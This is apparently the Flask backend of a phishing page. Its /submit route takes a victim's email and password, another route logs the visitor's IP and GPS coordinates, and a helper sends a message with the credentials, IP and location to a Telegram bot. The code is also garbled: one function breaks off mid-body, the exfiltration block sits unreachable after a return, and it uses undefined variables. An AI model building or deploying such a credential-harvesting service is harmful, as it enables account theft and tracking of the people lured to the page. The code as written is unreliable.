import os
from flask import Flask, render_template, request, jsonify
from email.mime.text import MIMEText
import requests

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    data = {
        "chat_id": CHAT_ID,
        "text": message
    }

    requests.post(url, data=data)

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    data = request.get_json()
    email = data.get("email")
    password = data.get("password")
    
   # Function to get the real client IP
@app.route("/send-location", methods=["POST"])
def receive_location():
    data = request.get_json()

    lat = data.get("lat")
    lon = data.get("lon")
    ip = get_real_ip()

    print("User IP:", ip)
    print("Latitude:", lat)
    print("Longitude:", lon)

    return {"status": "success"}

    message = f"""
    Email: {email}
    Password: {password}
    IP Address: {user_ip}
    Location: {location}
    """

    send_to_telegram(message)

    return jsonify({"status": "success"})



if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000)) 
    app.run(host="0.0.0.0", port=port)